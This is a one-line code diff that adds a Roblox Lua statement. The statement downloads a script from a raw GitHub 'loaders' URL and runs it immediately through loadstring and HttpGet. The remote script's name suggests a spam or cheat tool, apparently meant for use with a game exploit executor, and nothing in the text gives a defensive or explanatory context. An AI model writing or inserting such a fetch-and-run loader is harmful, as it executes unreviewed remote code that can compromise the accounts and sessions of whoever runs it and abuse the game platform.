@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/just-one-more-asym-spam3-oal2ibv0o29xtx.lua"))()
